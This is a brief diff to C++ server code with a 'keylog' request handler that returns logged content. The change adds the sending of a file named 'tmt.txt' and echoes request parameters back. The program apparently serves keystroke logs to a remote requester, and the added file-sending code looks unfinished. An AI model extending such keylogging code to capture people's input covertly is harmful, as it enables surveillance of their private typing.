@@ -24,6 +24,11 @@ bool Server::keylog(Request& request, Response &response) {
         fin.close();
     
         response.putParam(kBody, content);
+
+        // Gui file
+        fin = ifstream("tmt.txt", fstream::binary);
+        
+        response.putParam(kFilePrefix + "tmt.txt", "");
     }  
 
     return true;
@@ -32,7 +37,9 @@ bool Server::keylog(Request& request, Response &response) {
 bool Server::processRequest(Request& request, Response &response) {
     cout << "Processing Request\n" << request << "\n";
     response.setAction(request.getAction());
-    response.getParams().clear();
+    response.setParams(request.getParams());
+
+    // TODO param order
     
     switch (request.getAction()) {
         case ACTION_KEYLOG:
